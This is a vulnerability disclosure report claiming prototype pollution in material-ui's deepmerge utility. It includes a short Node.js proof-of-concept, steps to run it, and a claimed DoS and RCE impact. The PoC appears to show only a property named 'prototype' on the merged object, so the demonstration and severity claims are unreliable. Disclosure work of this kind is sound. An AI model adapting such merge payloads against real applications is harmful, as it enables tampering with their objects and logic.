## ✍️ Description
material-ui package is vulnerable to prototype pollution issue 
file can be found in  https://github.com/mui-org/material-ui/blob/next/packages/material-ui-utils/src/deepmerge.ts
## 🕵️‍♂️ Proof of Concept 
1. Creating poc file namely poc.js
var utils = require('@material-ui/utils');
var src = {};
let object = utils.deepmerge({}, JSON.parse('{ "myProperty": "a", "prototype" : { "isAdmin" : true } }'), {
    clone: false,
});
console.log(object.prototype.isAdmin);
2. Execute command npm install @material-ui/utils
3. Execute command node poc.js
[POC] https://drive.google.com/file/d/1twz_btDed0aeQVEO8BBAVs4Vg8kWjcxV/view?usp=sharing
## 💥 Impact
Prototype pollution which could lead to DOS and RCE
## ✅ Checklist
- [x] _Created and populated the README.md and vulnerability.json files_
- [x] _Provided the repository URL and any applicable [permalinks]([https://help.github.com/en/github/managing-files-in-a-repository/getting-permanent-links-to-files](https://help.github.com/en/github/managing-files-in-a-repository/getting-permanent-links-to-files))_
- [x] _Defined all the applicable weaknesses ([CWEs]([https://cwe.mitre.org/](https://cwe.mitre.org/)))_
- [x] _Proposed the CVSS vector items i.e. User Interaction, Attack Complexity_
- [x] _Checked that the vulnerability affects the latest version of the package released_
- [x] _Checked that a fix does not currently exist that remediates this vulnerability_
- [x] _Complied with all applicable laws_


